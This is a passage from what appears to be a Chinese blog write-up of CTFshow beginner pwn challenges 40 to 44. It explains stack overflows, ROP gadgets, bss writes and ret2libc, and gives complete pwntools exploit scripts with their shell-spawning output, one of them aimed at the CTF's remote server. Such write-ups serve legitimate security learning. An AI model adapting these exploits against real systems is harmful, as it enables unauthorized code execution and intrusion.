c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hint：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里与上一题一样，有system函数，有‘&#x2F;bin&#x2F;sh’字符串，但是不在一起，因此我们仍然需要手动进行构造payload</p><p>64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br></pre></td></tr></table></figure><p>对每个部分进行逐步解释：</p><ol><li><p>‘a’*(0xA+8) : 这部分生成了一个由字符 ‘a’ 组成的字符串，长度为0xA+8。这是为了填充缓冲区，达到溢出栈帧的目的。</p></li><li><p>p64(pop_rdi) : 这部分使用 p64 函数将 pop_rdi 的地址转换为一个8字节的字符串。pop_rdi 指令用于将值从栈上弹出并存储到寄存器rdi中。在这个payload中，它用于准备传递给 system 函数的第一个参数。</p></li><li><p>p64(bin_sh) : 这部分使用 p64 函数将 bin_sh 的地址转换为一个8字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 &#x2F;bin&#x2F;sh ）的指针。该字符串将作为 system 函数的第一个参数。</p></li><li><p>p64(ret) : 这部分使用 p64 函数将 ret 的地址转换为一个8字节的字符串。 ret 是一个返回指令，用于将程序控制权返回到栈上保存的地址。在这个payload中，它被用作一个间接跳转指令，用于绕过栈中的返回地址，以达到执行 system 函数的目的。</p></li><li><p>p64(system) : 这部分使用 p64 函数将 system 的函数地址转换为一个8字节的字符串。system 是一个函数指针，指向一个可以执行系统命令的函数。最终我们的目的就是通过栈溢出修改返回地址，以控制程序执行流程。它通过调用 pop_rdi 指令将bin_sh 的地址加载到寄存器rdi中，然后通过 ret 指令进行间接跳转，最终调用 system 函数，以执行system(“&#x2F;bin&#x2F;sh”)进而获得一个我们想要的shell。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:00000000004004FE                 retn</span><br><span class="line">.rodata:0000000000400808 s               db &#x27;/bin/sh&#x27;,0          ; DATA XREF: hint+4↑o</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4007E3</span></span><br><span class="line">bin_sh=<span class="number">0x400808</span></span><br><span class="line">ret=<span class="number">0x4004FE</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 239</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>,but they don<span class="string">&#x27;t work together</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">Just easy ret2text&amp;&amp;64bit</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure><h2 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h2><p>Hint：32位的 system(); 但是没”&#x2F;bin&#x2F;sh” ，好像有其他的可以替代</p><p>与上面一样，只不过这次出现的不是“&#x2F;bin&#x2F;sh”字符串，题目提示让我们找到一个字符串来进行替代它，通过对前面的学习，我们知道可以使用”sh”来进行替代“&#x2F;bin&#x2F;sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">useful</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么它两有什么区别呢？</p><ol><li><p>system(“&#x2F;bin&#x2F;sh”) ：</p><ul><li>在Linux和类Unix系统中， &#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用 system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。</li><li>这种方式可以确保使用系统默认的shell程序执行命令，因为 &#x2F;bin&#x2F;sh 链接通常指向默认shell的可执行件。</li></ul></li><li><p>system(“sh”) ：</p><ul><li>使用 system(“sh”) 会直接启动一个名为 sh 的shell程序，并在新的子进程中执行。</li><li>这种方式假设系统的环境变量 $PATH 已经配置了能够找到 sh 可执行文件的路径，否则可能会导致找不到 sh 而执行失败。</li></ul></li></ol><p>总结来说， system(“&#x2F;bin&#x2F;sh”) 是直接指定了系统默认的shell程序路径来执行命令，而system(“sh”) 则依赖系统的环境变量 $PATH 来查找 sh 可执行文件并执行。如果系统的环境变量设置正确，这两种方式是等效的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:080487BA aSh             db &#x27;sh&#x27;,0               ; DATA XREF: useful+14↑o</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=<span class="number">0x080487BA</span></span><br><span class="line">payload=cyclic(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 263</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system ,but don<span class="string">&#x27;t have &#x27;</span>/bin/sh<span class="string">&#x27;.Find something to replace it!</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure><h2 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h2><p>Hint：64位的 system(); 但是没”&#x2F;bin&#x2F;sh” ，好像有其他的可以替代</p><p>同上，也仅仅是64位与32位的区别</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x0000000000400843 : pop rdi ; ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:000000000040053E                 retn</span><br><span class="line">.rodata:0000000000400872 format          db &#x27;sh&#x27;,0               ; DATA XREF: useful+4↑o</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400843</span></span><br><span class="line">ret=<span class="number">0x40053E</span></span><br><span class="line">sh=<span class="number">0x400872</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 286</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system ,but don<span class="string">&#x27;t have &#x27;</span>/bin/sh<span class="string">&#x27;.Find something to replace it!</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure><h2 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h2><p>Hint：32位的 system(); 但是好像没”&#x2F;bin&#x2F;sh” 上面的办法不行了，想想办法</p><p>这题又有所不同了，存在system函数，但是没有了参数供我们使用，需要我们自己去进行构造。我们一步步的开始学习新东西</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop ebx ; ret&quot;</span></span><br><span class="line">0x08048409 : pop ebx ; ret</span><br></pre></td></tr></table></figure><p>可以看到是32位程序，关闭栈保护和PIE保护的</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，简单查看各个函数后跟进漏洞函数ctfshow：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v3 = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == v2 )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;where is shell?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次有变化了，这次是用gets函数进行读入数据，它可以无限读取，不会判断上限，可以包含空格，以回车结束读取。所以这里就存在了明显的溢出</p><p>同时我们可以看到程序中已有system函数，那么我们只需要去找到它的参数，但是遗憾的是并没有找到</p><p>但是我们可以注意bss段有一个buf2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B060                 public buf2</span><br><span class="line">.bss:0804B060 buf2            db    ? ;</span><br></pre></td></tr></table></figure><p>那么我们向程序中 bss 段的 buf2 处写入 “&#x2F;bin&#x2F;sh” 字符串，并将其地址作为 system 的参数传入。</p><p>我们可以构造如下payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system)</span><br><span class="line">+ <span class="string">&#x27;aaaa&#x27;</span> + p32(buf2)</span><br></pre></td></tr></table></figure><p>我们逐步解释此payload：</p><ol><li><p>cyclic(0x6c+4) : 这部分使用pwntools库中的 cyclic 函数生成一个循环模式的字符串，长度为0x6c+4。循环模式字符串用于进行调试和定位溢出点。当然这里你也可以继续使用 b’a’*(0x6c+4)也是没有问题的。</p></li><li><p>p32(gets) : 这部分使用pwntools的 p32 函数将 gets 函数的地址转换为一个4字节的字符串。它用于将 gets 函数的地址作为返回地址覆盖到栈上。使程序在溢出时调用 gets 函数。</p></li><li><p>p32(pop_ebx) : 这部分使用 p32 函数将 pop_ebx 的地址转换为一个4字节的字符串。pop_ebx 是一个指令序列，用于将栈上的值弹出并存储到寄存器ebx中。(清理栈)</p></li><li><p>p32(buf2) : 这部分使用 p32 函数将 buf2 的地址转换为一个4字节的字符串。 buf2 是一个指向存储输入数据的缓冲区的指针。</p></li><li><p>p32(system) : 这部分使用 p32 函数将 system 函数的地址转换为一个4字节的字符串。它将用于将 system 函数的地址作为返回地址覆盖到栈上。</p></li><li><p>‘aaaa’ : 这部分是一个4字节的字符串，用于填充栈上的返回地址的剩余空间。【可以写成p32(0)]</p></li><li><p>p32(buf2) : 这部分使用 p32 函数将 buf2 的地址转换为一个4字节的字符串。它作为pop_ebx 指令的参数，用于将 buf2 的地址加载到寄存器ebx中。</p></li></ol><p>这个payload的目的是通过栈溢出漏洞控制程序的执行流程。它通过覆盖返回地址，将 gets 函数的地址作为返回地址覆盖到栈上。然后使用 pop_ebx 指令将 buf2 的地址加载到寄存器ebx中，最后覆盖返回地址为 system 函数的地址。通过这样的方式，可以执行 system(buf2) 来执行 buf2 指向的字符串所表示的系统命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 栈布局（高地址 → 低地址）</span><br><span class="line">+-------------------+  ← 初始栈顶（溢出前）</span><br><span class="line">|       ...         |  其他栈数据</span><br><span class="line">+-------------------+</span><br><span class="line">|   s[103] (局部)   |  ctfshow函数的局部数组s[104]</span><br><span class="line">|   s[102] (局部)   |  偏移：ebp-0x6C 到 ebp-0x1</span><br><span class="line">|       ...         |</span><br><span class="line">|   s[0] (局部)     |</span><br><span class="line">+-------------------+  ← ebp-0x6C（s的起始地址）</span><br><span class="line">|      ebp值        |  旧基址指针（4字节），偏移：ebp</span><br><span class="line">+-------------------+  ← 返回地址（溢出目标）</span><br><span class="line">|  gets函数地址     |  [溢出覆盖] 第一步：跳转到gets函数</span><br><span class="line">+-------------------+  ← gets执行完后返回的地址</span><br><span class="line">|  pop_ebx地址      |  [溢出覆盖] 第二步：执行pop ebx; ret</span><br><span class="line">+-------------------+  ← pop_ebx的参数（gets的参数）</span><br><span class="line">|  buf2地址(0x804B060)| [溢出覆盖] 往buf2写入&quot;/bin/sh&quot;(告诉gets将输入写入到buf2地址)</span><br><span class="line">+-------------------+  ← pop_ebx执行完后返回的地址</span><br><span class="line">|  system函数地址   |  [溢出覆盖] 第三步：跳转到system函数</span><br><span class="line">+-------------------+  ← system执行完后返回的地址（无用）</span><br><span class="line">|  占位数据(aaaa)   |  [溢出覆盖] 随便填4字节（如0x61616161）</span><br><span class="line">+-------------------+  ← system的参数</span><br><span class="line">| buf2地址(0x804B060)| [溢出覆盖] system(&quot;/bin/sh&quot;)的参数(告诉system执行buf2地址处的字符串)</span><br><span class="line">+-------------------+  ← 溢出后的栈顶（payload末尾）</span><br><span class="line">|       ...         |  更低地址的栈数据</span><br><span class="line"></span><br><span class="line"># 执行流程箭头说明：</span><br><span class="line">ctfshow函数崩溃 → 跳转到gets函数 → 执行gets(buf2) → 接收输入&quot;/bin/sh&quot;写入buf2 → 跳转到pop_ebx → 弹出buf2地址到ebx → 跳转到system函数 → system读取参数buf2 → 执行system(&quot;/bin/sh&quot;) → 获取shell</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里通过输入传递给 gets 函数。由于payload中已经控制了程序的执行流程，这个输入将成为gets 函数的输入，进而被作为 system 函数的参数执行系统命令。</p><p>最终我们这样就执行了system(“&#x2F;bin&#x2F;sh”) 进而实现了我们的目的了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">buf2=<span class="number">0x0804B060</span></span><br><span class="line">gets=elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_ebx=<span class="number">0x08048409</span></span><br><span class="line">payload=cyclic(<span class="number">0x6C</span>+<span class="number">4</span>)+p32(gets)+p32(pop_ebx)+p32(buf2)+p32(system)+p32(<span class="number">0</span>)+p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 308</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">/CTFshow_pwn/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : This <span class="keyword">time</span> there is no replacement! How to <span class="keyword">do</span>?</span><br><span class="line">    * *************************************</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure><h2 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h2><p>Hint：64位的 system(); 但是好像没”&#x2F;bin&#x2F;sh” 上面的办法不行了，想想办法</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x00000000004007f3 : pop rdi ; ret  </span><br></pre></td></tr></table></figure><p>64位程序仍然是关闭栈保护与PIE</p><p>IDA查看漏洞函数ctfshow：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;no shell for you&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是栈溢出漏洞，跟上题一样，有system函数，没有参数，也没有看到可以替代的</p><p>我们构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(0xA + 8) + p64(pop_rdi) + p64(buf2) + p64(gets) +</span><br><span class="line">p64(pop_rdi) + p64(buf2) + p64(system) </span><br></pre></td></tr></table></figure><p>首先利用 pop_rdi 指令将 buf2 的地址加载到 rdi 寄存器中。调用 gets 函数，以 buf2 的地址作为参数，从用户输入中读取数据，并将其存储在 buf2 中。再次利用 pop_rdi 指令将 buf2 的地址加载到rdi 寄存器中。调用 system 函数，以 buf2 的地址作为参数，执行指定的命令。</p><p>或者也可以直接套板子ret2libc直接求解也是可以的（在下面的几题也是用的此种做法）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000602080                 public buf2</span><br><span class="line">.bss:0000000000602080 buf2            db    ? ;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 栈布局（高地址 → 低地址）</span><br><span class="line">+-----------------------+  ← 初始栈顶（溢出前）</span><br><span class="line">|        ...            |  其他栈数据</span><br><span class="line">+-----------------------+</span><br><span class="line">|   局部变量（0xA字节）  |  被cyclic(0xA)覆盖</span><br><span class="line">+-----------------------+</span><br><span class="line">|       rbp值           |  旧基址指针（8字节），被cyclic(8)覆盖</span><br><span class="line">+-----------------------+  ← 返回地址（溢出目标）</span><br><span class="line">|   pop rdi地址         |  [溢出覆盖] 第一步：执行pop rdi; ret</span><br><span class="line">+-----------------------+  ← pop rdi的操作数（gets的参数）</span><br><span class="line">|   buf2地址(0x602080)  |  被弹出到rdi寄存器（gets要写入的地址）</span><br><span class="line">+-----------------------+  ← gets执行完后返回的地址</span><br><span class="line">|   gets函数地址        |  [溢出覆盖] 第二步：调用gets函数</span><br><span class="line">+-----------------------+  ← gets执行完后的返回地址</span><br><span class="line">|   pop rdi地址         |  [溢出覆盖] 第三步：再次执行pop rdi; ret</span><br><span class="line">+-----------------------+  ← pop rdi的操作数（system的参数）</span><br><span class="line">|   buf2地址(0x602080)  |  被弹出到rdi寄存器（此时已存&quot;/bin/sh&quot;）</span><br><span class="line">+-----------------------+  ← system执行完后返回的地址（可省略）</span><br><span class="line">|   system函数地址      |  [溢出覆盖] 第四步：调用system函数</span><br><span class="line">+-----------------------+  ← 溢出后的栈顶（payload末尾）</span><br><span class="line">|        ...            |  更低地址的栈数据</span><br><span class="line"></span><br><span class="line"># 执行流程箭头：</span><br><span class="line">溢出后 → pop rdi（rdi=buf2） → 调用gets → 写入&quot;/bin/sh&quot;到buf2 →</span><br><span class="line">pop rdi（rdi=buf2） → 调用system → system读取rdi中buf2的&quot;/bin/sh&quot; → 获取shell</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets=elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4007f3</span></span><br><span class="line">buf2=<span class="number">0x602080</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(buf2)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28137</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span> <span class="comment"># 0x00000000004007f3 : pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line">payload = cyclic(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +</span><br><span class="line">p64(main)</span><br><span class="line">io.recvuntil(<span class="string">&quot;get system parameter!&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"><span class="string">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span 